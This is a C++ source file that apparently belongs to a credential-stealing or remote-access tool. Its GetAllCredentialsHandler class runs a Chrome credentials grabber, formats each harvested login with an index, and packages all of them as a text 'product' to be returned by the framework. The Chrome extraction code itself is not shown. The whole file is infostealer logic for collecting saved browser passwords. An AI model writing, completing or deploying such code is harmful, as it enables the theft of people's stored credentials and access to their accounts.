#include "GetAllCredentialsHandler.hpp"

#include "../Grabbers/ChromeCredentialsGrabber.hpp"
#include "Products/TextTypedProduct.hpp"
#include "Utils/Strings.hpp"

GetAllCredentialsHandler::GetAllCredentialsHandler(std::unique_ptr<Event> operation_event):
	IOperationHandler(std::move(operation_event))
{
}

std::wstring GetAllCredentialsHandler::format_source(const std::wstring& source)
{
	return source + L" Credentials:";
}

std::wstring GetAllCredentialsHandler::format_credential(const Credential& credential, const size_t index)
{
	return Strings::concat(std::wstring(L"#"), Strings::to_wstring(index), std::wstring(L"\n"), credential.serialize());
}

void GetAllCredentialsHandler::run()
{
	static constexpr auto SUFFIX = L"\n";
	std::wstring product;

	for (const auto& grabber : make_grabbers())
	{
		std::optional<Credentials> credentials = grabber->grab_credentials();
		product.append(format_source(grabber->source()) + SUFFIX);

		if (credentials.has_value())
		{
			for (size_t i = 0; i < credentials->size(); ++i)
			{
				product.append(format_credential((*credentials)[i], i) + SUFFIX);
			}
		}
		else
		{
			product.append(L"[Not Supported]");
		}

		product.append(SUFFIX);
	}
	append(std::make_unique<TextTypedProduct>(product));
	finished();
}

std::vector<CredentialsGrabber::Ptr> GetAllCredentialsHandler::make_grabbers()
{
	std::vector<CredentialsGrabber::Ptr> result;

	result.push_back(std::make_unique<ChromeCredentialsGrabber>());

	return result;
}
